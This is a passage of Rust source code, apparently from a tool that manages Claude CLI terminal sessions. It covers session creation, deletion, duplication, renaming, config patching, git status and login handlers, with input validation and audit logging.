        .ok_or_else(|| AppError::NotFound(format!("session '{name}'")))?;
    let rt = db::sessions::runtime(&state.pool, name).await?;
    Ok(view(
        &s,
        rt.as_ref(),
        state.session_activity(name),
        state.statusline(name),
    ))
}

/// List archived (soft-deleted) sessions — the Archived sheet's data source.
/// Mirrors [`list`] but on `WHERE archived = 1` (most-recently-touched first).
/// Each row carries `archived: true` so the client renders them in the recovery
/// sheet rather than the live overview.
pub async fn list_archived(state: &AppState) -> Result<Vec<SessionView>, AppError> {
    let sessions = db::sessions::list_archived(&state.pool).await?;
    let rt_map: HashMap<String, SessionRuntime> = db::sessions::list_runtimes(&state.pool)
        .await?
        .into_iter()
        .map(|r| (r.name.clone(), r))
        .collect();
    Ok(sessions
        .iter()
        .map(|s| {
            view(
                s,
                rt_map.get(&s.name),
                state.session_activity(&s.name),
                state.statusline(&s.name),
            )
        })
        .collect())
}

/// Hard-delete (the "Delete forever" path): permanently DELETE an ARCHIVED
/// session row. Refuses when the row is missing (404) or still live (409,
/// `archived = 0`) so purge can never nuke a running/visible session. Audited
/// as `session.purge` (harder-destructive than `session.delete` — the archived
/// scrollback dump goes too), and the dump file under `<data_dir>/archives/` is
/// best-effort removed. `session_runtime` + child rows cascade via FK.
pub async fn purge(state: &AppState, name: &str) -> Result<(), AppError> {
    // Refuse a live (or absent) session BEFORE the destructive DELETE so the
    // caller gets a clean 404/409 rather than a silent no-op.
    match db::sessions::is_archived(&state.pool, name).await? {
        None => return Err(AppError::NotFound(format!("session '{name}'"))),
        Some(false) => {
            return Err(AppError::Conflict(format!(
                "session '{name}' is not archived — archive it before purging"
            )))
        }
        Some(true) => {}
    }

    let removed = db::sessions::purge_archived(&state.pool, name).await?;
    if removed == 0 {
        // Raced with another purge/unarchive between the guard and the DELETE.
        return Err(AppError::NotFound(format!("session '{name}'")));
    }

    // Audit row — every destructive HTTP call records an entry. `purge` is the
    // hardest-destructive session op (the row AND its archived scrollback are
    // gone), so it MUST leave a forensic trace. `?` (not `let _ =`) so a failed
    // audit-insert fails the request, matching the
    // `session.delete`/`session.archive` patterns.
    db::audit::log(&state.pool, "user", "session.purge", name, json!({})).await?;

    // Best-effort: remove the scrollback dump(s) this session wrote on archive
    // (`<data_dir>/archives/<name>-<ts>.log`). Failure is non-fatal — the row is
    // already gone; a stale dump is harmless and never re-surfaces in the UI.
    let archive_dir = state.config.data_dir.join("archives");
    let prefix = format!("{name}-");
    let _ = tokio::task::spawn_blocking(move || {
        if let Ok(entries) = std::fs::read_dir(&archive_dir) {
            for entry in entries.flatten() {
                let fname = entry.file_name();
                let fname = fname.to_string_lossy();
                if fname.starts_with(&prefix) && fname.ends_with(".log") {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
    })
    .await;

    // Drop any lingering per-session in-memory maps (hook token, locks, watches).
    // The background loops already exited at archive time (they guard on
    // `exists_active`), so this is just final cleanup.
    state.forget_session(name);
    Ok(())
}

#[derive(Debug, Deserialize)]
pub struct CreateInput {
    pub name: String,
    /// Human label for the UI (migration 0019). Free-form; the immutable slug
    /// `name` is derived/validated separately. Defaults to the slug when absent.
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub dir: Option<String>,
    #[serde(default)]
    pub desc: Option<String>,
    #[serde(default)]
    pub provider: Option<String>,
    #[serde(default)]
    pub creator: Option<String>,
    /// Extra provider CLI flags for this session's launch line, e.g.
    /// `--model opus`. Charset-restricted by [`validate_flags`]: it ends up on a
    /// command line that a shell parses, so anything shell-meta is a 400 naming
    /// the character (SEC-01).
    #[serde(default)]
    pub flags: Option<String>,
    #[serde(default)]
    pub tags: Option<Vec<String>>,
    #[serde(default)]
    pub branch: Option<String>,
    #[serde(default)]
    pub mcp: Option<String>,
    #[serde(default)]
    pub worktree: Option<bool>,
    /// FK into `hosts(id)` for a remote session (`NULL` = local). The web
    /// `POST /api/sessions {host_id: N}` body lands here; downstream the
    /// value flows into `NewSession` and the INSERT, so the SSH-transport
    /// resolver in `pty.rs` / `lifecycle.rs` actually sees a non-NULL row.
    #[serde(default)]
    pub host_id: Option<i64>,
    /// Boot Claude in bypass-permissions mode (`--permission-mode
    /// bypassPermissions`). A typed boolean — the server builds the trusted flag
    /// string, so the web never puts raw text on the `claude` command line
    /// (`flags` is spliced into the launch line — charset-checked by
    /// [`validate_flags`] and quoted again at render). Composes with the
    /// runtime Shift+Tab mode toggle (same `BYPASS_FLAG`), so a session created
    /// this way reads as `bypass` and the toggle round-trips.
    #[serde(default)]
    pub bypass_permissions: Option<bool>,
    /// Which terminal backend drives this session (migration 0024): `"native"`
    /// (the tmux-less pty holder) or `"tmux"`. Anything else is a 400;
    /// `"native"` combined with a `host_id` is a 400 too (see [`create`]).
    ///
    /// **Absent = NATIVE for a local session**, tmux for a remote-host one —
    /// the resolution [`create`] actually performs, a few lines below. This
    /// docstring said "Absent = `tmux`, the default and the whole existing
    /// fleet" long after native became the default, and it is the reason two
    /// e2e specs asserted against `tmux capture-pane -t supermux-<name>` for a
    /// session that has no tmux pane at all and logged "can't find pane" until
    /// they timed out.
    #[serde(default)]
    pub runtime: Option<String>,
}

pub async fn create(state: &AppState, input: CreateInput) -> Result<SessionView, AppError> {
    let name = input.name.trim().to_string();
    if !valid_name(&name) {
        return Err(AppError::BadRequest(
            "invalid session name (allowed: letters, digits, '_', '.', '-')".into(),
        ));
    }
    let provider = input.provider.unwrap_or_else(|| "claude".into());
    if !valid_provider(&provider) {
        return Err(AppError::BadRequest(format!("invalid provider '{provider}'")));
    }
    // Runtime selection (migration 0024). Absent → NATIVE for local sessions
    // (the tmux-less runtime is the default: the daemon is the terminal), but
    // tmux for remote-host sessions (a holder is definitionally local — see the
    // native+host_id refusal below). Team lead/teammate creation passes an
    // explicit `tmux` (their panes ARE tmux constructs).
    let runtime_kind = input
        .runtime
        .map(|r| r.trim().to_string())
        .filter(|r| !r.is_empty())
        .unwrap_or_else(|| {
            if input.host_id.is_some() {
                runtime::RUNTIME_TMUX.to_string()
            } else {
                runtime::RUNTIME_NATIVE.to_string()
            }
        });
    if !runtime::valid_runtime(&runtime_kind) {
        return Err(AppError::BadRequest(format!(
            "invalid runtime '{runtime_kind}' (allowed: {}, {})",
            runtime::RUNTIME_TMUX,
            runtime::RUNTIME_NATIVE
        )));
    }
    // The native runtime is a LOCAL pty holder: supermux owns the child process
    // on THIS box. A remote-host session is driven over an SSH ControlMaster,
    // which has no holder to own — the two are definitionally exclusive, so
    // refuse the combination up front rather than create a row no runtime can
    // serve.
    if runtime_kind == runtime::RUNTIME_NATIVE && input.host_id.is_some() {
        return Err(AppError::BadRequest(
            "runtime 'native' cannot be combined with a remote host — the native runtime owns a \
             local pty holder; use runtime 'tmux' for remote-host sessions"
                .into(),
        ));
    }
    if db::sessions::exists(&state.pool, &name).await? {
        return Err(AppError::Conflict(format!(
            "session '{name}' already exists"
        )));
    }

    let dir = input
        .dir
        .filter(|d| !d.trim().is_empty())
        .unwrap_or_else(|| {
            dirs::home_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|| ".".into())
        });
    let tags = input.tags.unwrap_or_default();
    let display_name = input
        .display_name
        .map(|d| d.trim().to_string())
        .filter(|d| !d.is_empty())
        .unwrap_or_else(|| name.clone());
    // Build the per-session launch flags. The web sends a typed `bypass_permissions`
    // boolean (never raw flags); the trusted `BYPASS_FLAG` is appended here so the
    // session boots in bypass mode and the runtime mode toggle round-trips on it.
    //
    // The caller's half is validated FIRST (SEC-01): `flags` is spliced into the
    // launch command line, so a shell metacharacter in it is a command-execution
    // primitive, not a bad string. Checked before the trusted flag is appended so
    // the 400 only ever talks about what the caller actually sent, and before the
    // DB write so a poisoned value never becomes a stored row.
    let mut flags = input.flags.unwrap_or_default();
    validate_flags(&flags)?;
    if input.bypass_permissions.unwrap_or(false) && !flags.contains(lifecycle::BYPASS_FLAG) {
        flags = format!("{flags} {}", lifecycle::BYPASS_FLAG)
            .trim()
            .to_string();
    }
    let new = NewSession {
        name: name.clone(),
        display_name,
        dir,
        desc: input.desc.unwrap_or_default(),
        provider,
        creator: input.creator.unwrap_or_default(),
        flags,
        tags: serde_json::to_string(&tags).unwrap_or_else(|_| "[]".into()),
        branch: input.branch.unwrap_or_default(),
        mcp: input.mcp.unwrap_or_default(),
        worktree: input.worktree.unwrap_or(false),
        worktree_repo: String::new(),
        host_id: input.host_id,
        runtime: runtime_kind,
    };
    db::sessions::create(&state.pool, &new).await?;
    let hook_token = gen_hook_token();
    db::sessions::ensure_runtime(&state.pool, &name, &hook_token).await?;
    state.hook_tokens.insert(name.clone(), hook_token);
    // Start this session's 2s status detector loop (the loop self-terminates
    // when the session is deleted). Boot-time sessions are wired by
    // `auto_actions::spawn_all`; this covers sessions created in-process.
    auto_actions::spawn_status_loop(state.clone(), name.clone());
    // Start this session's steering delivery loop (mirrors the detector
    // lifecycle — self-terminates on delete; boot-time sessions are wired by
    // `steering::deliver_loop::spawn_all`).
    steering::deliver_loop::spawn(state.clone(), name.clone());
    get(state, &name).await
}

pub async fn delete(state: &AppState, name: &str) -> Result<(), AppError> {
    ensure_session(state, name).await?;
    // Capture whether any board card links to this session BEFORE the delete.
    // The `issues.session` FK is `ON DELETE SET NULL`, so after the row is gone
    // the link is already nulled and `issues_for_session` would find nothing — we
    // must check first, then re-publish the board AFTER so open boards drop the
    // now-dangling link (`session_live` → false) without a manual refetch.
    let had_linked_issues = !db::board::issues_for_session(&state.pool, name)
        .await
        .unwrap_or_default()
        .is_empty();
    // Best-effort runtime teardown so a deleted session leaves no orphan
    // pane/holder/FIFO. Resolved through the seam so a native session's holder
    // is torn down by its own runtime; for tmux this is the same
    // `kill-session` as before. Best-effort BOTH ways: an unresolvable runtime
    // (e.g. a native row on a build where the native core isn't wired) must
    // never block deleting the row.
    let is_native = !state.is_tmux_runtime(name).await;
    if let Ok(rt) = state.runtime_for(name).await {
        let _ = rt.kill().await;
    }
    // A native session owns a directory under the data dir (spool, `meta.json`,
    // the holder socket, the exit marker). The kill above ends the holder; this
    // reclaims the disk — up to `SPOOL_CAP` (64 MiB) per session — and makes
    // sure a LATER session created with the same name starts from a blank grid
    // instead of adopting this one's history. Ordered after the kill so the
    // holder can not still be writing into a directory we are removing.
    if is_native {
        native::remove_session_data(name, &state.config.data_dir);
    }
    db::sessions::delete(&state.pool, name).await?;

    // Audit row — every destructive HTTP call records an entry. `delete` is
    // harder-destructive than `archive` (the row is gone, not just
    // soft-archived), so it MUST leave a forensic trace. Uses `?` (not
    // `let _ =`) so a failed audit-insert fails the request, matching
    // board/mod.rs, files/mod.rs, scheduler/runner.rs, agents/delegate.rs, and
    // the archive path in lifecycle.rs.
    db::audit::log(&state.pool, "user", "session.delete", name, json!({})).await?;

    // Nudge the per-session background loops to re-check their `exists_active`
    // guard immediately (detector via the wake handle; steering via a no-op
    // status-watch re-send), so they observe the deleted row and exit.
    state.wake_detector(name);
    {
        let tx = state.status_watch_for(name);
        let cur = tx.borrow().clone();
        tx.send_replace(cur);
    }

    // `forget_session` must be the LAST thing — wait for every per-session
    // loop to stop (task-guard count → 0) before dropping the DashMap entries,
    // otherwise a still-running loop's `or_insert_with` re-creates them.
    for _ in 0..100 {
        if state.live_session_tasks(name) == 0 {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    // Lock-map lifecycle: drop every per-session in-memory map entry so
    // session churn does not leak DashMap entries.
    state.forget_session(name);

    // If any card linked to this (now-deleted) session, re-publish the board
    // so open boards reflect the FK-nulled, now-stale link immediately.
    if had_linked_issues {
        crate::board::emit_board(state).await;
    }
    Ok(())
}

pub async fn duplicate(
    state: &AppState,
    src: &str,
    new_name: &str,
) -> Result<SessionView, AppError> {
    ensure_session(state, src).await?;
    // T6.4 — the caller no longer has to invent a name. §15.1 asks for a
    // `<name> copy` default, and an empty `new_name` is what requests it; a
    // supplied name still wins, so every existing caller is unchanged.
    let new_name = if new_name.trim().is_empty() {
        next_copy_name(state, src).await?
    } else {
        new_name.trim().to_string()
    };
    let new_name = new_name.as_str();
    if !valid_name(new_name) {
        return Err(AppError::BadRequest("invalid new_name".into()));
    }
    if db::sessions::exists(&state.pool, new_name).await? {
        return Err(AppError::Conflict(format!(
            "session '{new_name}' already exists"
        )));
    }
    db::sessions::duplicate(&state.pool, src, new_name).await?;
    // T6.2 — the schedules come too, DISABLED. Before B5 no child row was
    // cloned at all, so "duplicate this agent" silently dropped its jobs. They
    // arrive disabled because a copy that immediately starts firing cron jobs
    // is a surprise, and the framing is "a bot is its own template", not "its
    // own daemon" — the UI says so at the call site.
    match db::schedules::copy_for_session(&state.pool, src, new_name).await {
        Ok(0) => {}
        Ok(n) => tracing::info!(src = %src, new = %new_name, schedules = n, "duplicate: copied schedules (disabled)"),
        // Best-effort: a session without its schedules is still a usable copy,
        // and failing the whole duplicate over them would be worse.
        Err(e) => tracing::warn!(src = %src, error = %e, "duplicate: could not copy schedules"),
    }
    let hook_token = gen_hook_token();
    db::sessions::ensure_runtime(&state.pool, new_name, &hook_token).await?;
    state.hook_tokens.insert(new_name.to_string(), hook_token);
    // A duplicated session is a real session — give it the same detector
    // and steering delivery loops a created one gets.
    auto_actions::spawn_status_loop(state.clone(), new_name.to_string());
    steering::deliver_loop::spawn(state.clone(), new_name.to_string());
    get(state, new_name).await
}

/// The default name for a copy: `<name> copy`, then `<name> copy 2`, `3`, …
///
/// §15.1 asks for `<name> copy` with "the usual collision suffix". Slugs cannot
/// hold spaces, so the separator is `-` — the DISPLAY name is what a user
/// reads, and `duplicate` sets that to the new slug anyway.
async fn next_copy_name(state: &AppState, src: &str) -> Result<String, AppError> {
    let base = format!("{src}-copy");
    if !db::sessions::exists(&state.pool, &base).await? {
        return Ok(base);
    }
    // Bounded: 99 copies of one session is not a workflow, it is a runaway
    // loop, and returning a clean error beats scanning forever.
    for n in 2..100 {
        let candidate = format!("{base}-{n}");
        if !db::sessions::exists(&state.pool, &candidate).await? {
            return Ok(candidate);
        }
    }
    Err(AppError::Conflict(format!(
        "too many copies of '{src}' — name the next one yourself"
    )))
}

/// Config patch — the tmux-free fields of `PATCH .../config`. `model`,
/// `toggle_yolo`, and `new_conversation` involve flags/resume mechanics and live
/// with the lifecycle handlers below.
#[derive(Debug, Deserialize)]
pub struct ConfigInput {
    /// Edit the mutable display label (migration 0019). This is the user-facing
    /// "rename": it changes ONLY the label, never the slug — so the route, the
    /// tmux session, $SUPERMUX_SESSION, and the per-pane hook token all stay put
    /// and a running pane can never go stale. Free-form text.
    pub display_name: Option<String>,
    /// Low-level slug rename. Retained as an internal capability (kept out of the
    /// UI): mutating the slug rewrites the PK + every FK + the tmux name, and a
    /// running pane's frozen env can't follow — which is exactly the staleness
    /// the `display_name` split exists to avoid. Prefer `display_name`.
    pub rename: Option<String>,
    pub desc: Option<String>,
    pub dir: Option<String>,
    pub branch: Option<String>,
    pub mcp: Option<String>,
    pub tags: Option<Vec<String>>,
    pub toggle_pin: Option<bool>,
    pub toggle_auto_continue: Option<bool>,
    /// Freeze this session's identity mark (migration 0027). `Some("")` clears
    /// the override and returns the session to its derived face — the one way
    /// back, and the reason this is not a bare `Option<String>` meaning "unset".
    pub mark_pin: Option<String>,
    /// Set this bot's notification policy (migration 0028): `inherit` | `all` |
    /// `attention` | `off`. An unrecognised value is a 400 rather than a silent
    /// coercion — mis-typing this would quietly change whether the user's phone
    /// rings, which is exactly the class of failure that must be loud.
    pub notif: Option<String>,
}

pub async fn config_patch(
    state: &AppState,
    name: &str,
    patch: ConfigInput,
) -> Result<SessionView, AppError> {
    ensure_session(state, name).await?;
    let mut current = name.to_string();
    let mut changed = false;

    if let Some(target) = patch.rename.as_deref() {
        let target = target.trim();
        if !valid_name(target) {
            return Err(AppError::BadRequest("invalid rename target".into()));
        }
        if target != current {
            if db::sessions::exists(&state.pool, target).await? {
                return Err(AppError::Conflict(format!(
                    "session '{target}' already exists"
                )));
            }
            // Complete the rename across all three layers so a RUNNING session
            // survives it. The live tmux session is named `supermux-<name>`, so
            // without renaming it the renamed row would point at a tmux target
            // that no longer exists and the terminal would go dark. Order: rename
            // tmux FIRST (the only fallible external step) so a failure aborts
            // before the DB drifts; the window/pane (and its pipe-pane capture)
            // survive the rename untouched.
            //
            // Runtime seam: the tmux rename is a TMUX-SHAPED step — it renames
            // an EXTERNAL multiplexer session that the DB row points at.
            //
            // The NATIVE runtime is name-keyed too, just on disk instead of in a
            // multiplexer: `<data>/native/<name>/` holds the spool, `meta.json`
            // and the holder's unix socket, and the running holder was told that
            // socket PATH at spawn — it can not be moved underneath it without a
            // protocol change. A DB-only rename therefore ORPHANED the holder
            // (and its agent, and the daemon's pump): the renamed row resolved to
            // a fresh, empty session dir while the old holder kept running
            // forever with nothing attached.
            //
            // So: refuse the rename while it is running (409, the same shape the
            // rest of the API uses for "wrong state"), and MOVE the directory
            // when it is not. Moving first keeps the tmux ordering discipline —
            // the fallible external step happens before the DB write.
            let live = if state.is_tmux_runtime(&current).await {
                let tmux = tmux::Tmux::new(&current);
                let live = tmux.exists().await.unwrap_or(false);
                if live {
                    tmux.rename_session(target).await?;
                }
                live
            } else {
                if state.runtime_for(&current).await?.alive().await {
                    return Err(AppError::Conflict(format!(
                        "session '{current}' is running — stop it before renaming \
                         (a native session's pty holder is keyed by its name and \
                         can not follow the rename while live)"
                    )));
                }
                native::rename_session_data(&current, target, &state.config.data_dir)
                    .map_err(|e| {
                        anyhow::anyhow!("moving native session data for '{current}': {e}")
                    })?;
                false
            };
            db::sessions::rename(&state.pool, &current, target).await?;
            // Carry the per-session in-memory maps (lock/watch/hook token) over.
            state.rename_session(&current, target);
            // The carried pty stream still polls the OLD tmux name for liveness;
            // drop it so the next attach rebuilds fresh against `supermux-<new>`
            // (same pattern as a restart). No-op for a stopped session.
            if live {
                state.pty_invalidate(target);
            }
            current = target.to_string();
        }
        changed = true;
    }
    if let Some(v) = patch.display_name {
        // The user-facing rename: relabel only. An empty/whitespace value resets
        // the label to the slug (so the UI never shows a blank title).
        let label = v.trim();
        let value = if label.is_empty() { current.as_str() } else { label };
        // Read the label we are replacing BEFORE the write, so the audit row can
        // say what it was. An empty stored label means "the slug" (see `view`),
        // so normalise both sides before comparing — otherwise clearing an
        // already-empty label would audit as a rename that changed nothing.
        let previous = db::sessions::get(&state.pool, &current)
            .await?
            .map(|s| s.display_name)
            .unwrap_or_default();
        let previous = if previous.is_empty() { current.clone() } else { previous };
        db::sessions::set_display_name(&state.pool, &current, value).await?;
        if previous != value {
            // Ledger row + `harness` tick: the transcript renders a rename only
            // when an AGENT did it (a line telling the owner what they typed two
            // seconds ago is ceremony), but the row is written either way so the
            // feed stays a complete history.
            let _ = audit_harness(
                state,
                "user",
                "session.rename",
                &current,
                json!({ "from": previous, "to": value }),
                &[current.as_str()],
            )
            .await;
        }
        changed = true;
    }
    if let Some(v) = patch.desc {
        db::sessions::set_desc(&state.pool, &current, &v).await?;
        changed = true;
    }
    if let Some(v) = patch.dir {
        db::sessions::set_dir(&state.pool, &current, &v).await?;
        changed = true;
    }
    if let Some(v) = patch.branch {
        db::sessions::set_branch(&state.pool, &current, &v).await?;
        changed = true;
    }
    if let Some(v) = patch.mcp {
        db::sessions::set_mcp(&state.pool, &current, &v).await?;
        changed = true;
    }
    if let Some(v) = patch.tags {
        let json = serde_json::to_string(&v).unwrap_or_else(|_| "[]".into());
        db::sessions::set_tags(&state.pool, &current, &json).await?;
        changed = true;
    }
    if let Some(v) = patch.mark_pin {
        // An empty value CLEARS the override (back to the derived face) rather
        // than storing "". Validation is deliberately light — the client owns
        // the `"<silhouette>:<hue>"` vocabulary and decodes unknown values to
        // "no override", so a stale string degrades instead of failing a PATCH.
        let trimmed = v.trim();
        db::sessions::set_mark_pin(
            &state.pool,
            &current,
            if trimmed.is_empty() { None } else { Some(trimmed) },
        )
        .await?;
        changed = true;
    }
    if let Some(v) = patch.notif {
        let parsed = crate::notify::NotifPolicy::from_str(v.trim()).ok_or_else(|| {
            AppError::BadRequest(format!(
                "unknown notification policy '{v}' (expected inherit|all|attention|off)"
            ))
        })?;
        db::sessions::set_notif_policy(&state.pool, &current, parsed).await?;
        changed = true;
    }
    if patch.toggle_pin.is_some() {
        db::sessions::toggle_pin(&state.pool, &current).await?;
        changed = true;
    }
    if patch.toggle_auto_continue.is_some() {
        db::sessions::toggle_auto_continue(&state.pool, &current).await?;
        changed = true;
    }

    if !changed {
        return Err(AppError::BadRequest("no recognized config field".into()));
    }
    get(state, &current).await
}

// ── git status ───────────────────────────────────────────────────────────────

/// Live git status for a session's working dir, surfaced by
/// `GET /api/sessions/{name}/git`. The stored `branch` label is set once at
/// create time and goes stale; this reads the REAL state on demand so the info
/// panel never lies. Every field defaults to "not a repo" so a non-git dir (or a
/// missing `git` binary) degrades cleanly — the panel just hides the section.
#[derive(Debug, Default, Serialize)]
pub struct GitInfo {
    /// True when `dir` is inside a git work tree.
    pub repo: bool,
    /// Current branch name; the short commit SHA when HEAD is detached; empty
    /// when not a repo.
    pub branch: String,
    /// True when HEAD is detached (then `branch` holds the short SHA).
    pub detached: bool,
    /// True when the work tree has uncommitted changes (tracked or untracked).
    pub dirty: bool,
    /// Commits ahead of the upstream (0 when there is no upstream / not a repo).
    pub ahead: u32,
    /// Commits behind the upstream (0 when there is no upstream / not a repo).
    pub behind: u32,
}

/// Read the live git status of `dir` in a single `git status --porcelain=v2
/// --branch` (branch head, ahead/behind, and per-file change lines in one shot).
/// Never errors: anything other than a clean exit (not a repo, `git` absent, dir
/// gone) yields the default `GitInfo { repo: false, .. }`.
async fn git_info(dir: &str) -> GitInfo {
    let mut info = GitInfo::default();
    let out = match tokio::process::Command::new("git")
        .args(["-C", dir, "status", "--porcelain=v2", "--branch"])
        .output()
        .await
    {
        Ok(o) if o.status.success() => o,
        _ => return info,
    };
    info.repo = true;
    let text = String::from_utf8_lossy(&out.stdout);
    let mut oid = String::new();
    for line in text.lines() {
        if let Some(rest) = line.strip_prefix("# branch.") {
            if let Some(v) = rest.strip_prefix("oid ") {
                oid = v.trim().to_string();
            } else if let Some(v) = rest.strip_prefix("head ") {
                let v = v.trim();
                if v == "(detached)" {
                    info.detached = true;
                } else {
                    info.branch = v.to_string();
                }
            } else if let Some(v) = rest.strip_prefix("ab ") {
                // "+<ahead> -<behind>"
                for tok in v.split_whitespace() {
                    if let Some(n) = tok.strip_prefix('+') {
                        info.ahead = n.parse().unwrap_or(0);
                    } else if let Some(n) = tok.strip_prefix('-') {
                        info.behind = n.parse().unwrap_or(0);
                    }
                }
            }
        } else if !line.starts_with('#') && !line.is_empty() {
            // Any 1/2/u/? entry line means the work tree is dirty.
            info.dirty = true;
        }
    }
    if info.detached {
        info.branch = oid.chars().take(12).collect();
    }
    info
}

// ── handlers ─────────────────────────────────────────────────────────────────

async fn list_handler(
    State(state): State<AppState>,
) -> Result<Json<Envelope<Vec<SessionView>>>, AppError> {
    Ok(ok(list(&state).await?))
}

async fn list_archived_handler(
    State(state): State<AppState>,
) -> Result<Json<Envelope<Vec<SessionView>>>, AppError> {
    Ok(ok(list_archived(&state).await?))
}

async fn get_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<Envelope<SessionView>>, AppError> {
    Ok(ok(get(&state, &name).await?))
}

async fn create_handler(
    State(state): State<AppState>,
    Json(input): Json<CreateInput>,
) -> Result<impl IntoResponse, AppError> {
    let v = create(&state, input).await?;
    Ok((StatusCode::CREATED, ok(v)))
}

async fn delete_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    delete(&state, &name).await?;
    Ok(Json(json!({ "ok": true })))
}

async fn purge_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    purge(&state, &name).await?;
    Ok(Json(json!({ "ok": true })))
}

#[derive(Debug, Deserialize)]
struct DuplicateInput {
    /// Optional since B5/T6.4: omit it (or send `""`) and the server picks
    /// `<name>-copy`, with the usual collision suffix. §15.1 asks that the
    /// caller not have to invent a name for what is conceptually "this one,
    /// again".
    #[serde(default)]
    new_name: String,
}

async fn duplicate_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<DuplicateInput>,
) -> Result<impl IntoResponse, AppError> {
    let v = duplicate(&state, &name, &input.new_name).await?;
    Ok((StatusCode::CREATED, ok(v)))
}

async fn git_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    let s = db::sessions::get(&state.pool, &name)
        .await?
        .ok_or_else(|| AppError::NotFound(format!("session '{name}'")))?;
    // An explicit on-open fetch — `git_info` runs `git` as an async child, so a
    // large work tree's stat cost never blocks the runtime.
    let info = git_info(&s.dir).await;
    Ok(Json(json!({ "ok": true, "data": info })))
}

async fn config_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<ConfigInput>,
) -> Result<Json<Envelope<SessionView>>, AppError> {
    Ok(ok(config_patch(&state, &name, input).await?))
}

// ── lifecycle handlers ───────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct StartInput {
    #[serde(default)]
    prompt: Option<String>,
}

async fn start_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    body: Bytes,
) -> Result<Json<serde_json::Value>, AppError> {
    // Body optional: `{}` or `{prompt}`.
    let input: StartInput = if body.is_empty() {
        StartInput { prompt: None }
    } else {
        serde_json::from_slice(&body)
            .map_err(|_| AppError::BadRequest("expected JSON body {prompt?}".into()))?
    };
    let result = lifecycle::start(&state, &name, input.prompt.as_deref()).await?;
    Ok(Json(json!({ "ok": true, "data": result })))
}

async fn stop_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<impl IntoResponse, AppError> {
    lifecycle::stop(&state, &name).await?;
    // Stop is async-shaped → 202 Accepted.
    Ok((StatusCode::ACCEPTED, Json(json!({ "ok": true }))))
}

#[derive(Debug, Deserialize)]
struct SendInput {
    text: String,
}

async fn send_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<SendInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    lifecycle::send_text(&state, &name, &input.text).await?;
    Ok(Json(json!({ "ok": true })))
}

#[derive(Debug, Deserialize)]
struct KeysInput {
    /// Accept either `{keys}` (canonical) or `{key}` for a single key.
    #[serde(default)]
    keys: Option<String>,
    #[serde(default)]
    key: Option<String>,
}

async fn keys_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<KeysInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    let key = input
        .keys
        .or(input.key)
        .ok_or_else(|| AppError::BadRequest("expected {keys} or {key}".into()))?;
    lifecycle::send_keys(&state, &name, &key).await?;
    Ok(Json(json!({ "ok": true })))
}

/// `POST /api/sessions/{name}/external-edit/submit` (bearer auth). The dashboard's
/// native-editor sheet posts the edited text (`{requestId, text}`) on "Done"/"Save"
/// or `{requestId, cancelled:true}` on dismiss; we resolve the session's in-flight
/// edit so the `$EDITOR` bridge's `/result` long-poll returns. A stale/missing
/// `requestId` (edit already resolved, timed out, or superseded) → 409 (the
/// dashboard just drops the sheet). See `crate::external_edit`.
async fn external_edit_submit_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(body): Json<crate::external_edit::SubmitBody>,
) -> Result<Json<serde_json::Value>, AppError> {
    crate::external_edit::submit(&state, &name, body).await?;
    Ok(Json(json!({ "ok": true })))
}

#[derive(Debug, Deserialize)]
struct PasteInput {
    text: String,
    #[serde(default)]
    submit: bool,
}

async fn paste_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<PasteInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    lifecycle::paste(&state, &name, &input.text, input.submit).await?;
    Ok(Json(json!({ "ok": true })))
}

/// `GET /api/sessions/{name}/login` — what is on the login screen right now.
///
/// Read-only and lock-free (it is a `peek` plus two pure classifiers), so the
/// card can poll it while the user is off in a browser without contending with
/// anything the session is doing.
async fn login_state_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    let view = login::view(&state, &name).await?;
    Ok(Json(json!({ "ok": true, "data": view })))
}

/// The one write. `action` names the step; nothing else about the request can
/// change which keys land on the pty.
#[derive(Debug, Deserialize)]
struct LoginActionInput {
    action: String,
    /// `method` — 0-based row in `Select login method:`.
    #[serde(default)]
    index: Option<usize>,
    /// `code` — the full `code#state` string from the callback page.
    ///
    /// THIS FIELD IS A CREDENTIAL. It is validated, written to the pty and
    /// dropped: it is never stored in `last_send_text`, never put on the SSE
    /// stream, never written to a log line, and it is not echoed in the
    /// response. `#[serde(default)]` so a body without it deserialises rather
    /// than erroring with the field name in a 422 the log might carry.
    #[serde(default)]
    code: Option<String>,
    /// `code` — send Ctrl-U first. Set on a RETRY only (see `login::submit_code`).
    #[serde(default)]
    clear: bool,
    /// `start` — drive `/design-login` instead of `/login`.
    #[serde(default)]
    design: bool,
}

/// `POST /api/sessions/{name}/login`
async fn login_action_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<LoginActionInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    match input.action.as_str() {
        "start" => {
            login::start(&state, &name, input.design).await?;
        }
        "method" => {
            login::choose_method(&state, &name, input.index.unwrap_or(0)).await?;
        }
        "code" => {
            let code = input
                .code
                .as_deref()
                .ok_or_else(|| AppError::BadRequest("no login code in the request".into()))?;
            login::submit_code(&state, &name, code, input.clear).await?;
        }
        // The mandatory Enter on `Login successful` — it is what writes
        // `hasCompletedOnboarding`. See `login::confirm`.
        "confirm" => login::confirm(&state, &name).await?,
        "cancel" => login::cancel(&state, &name).await?,
        other => {
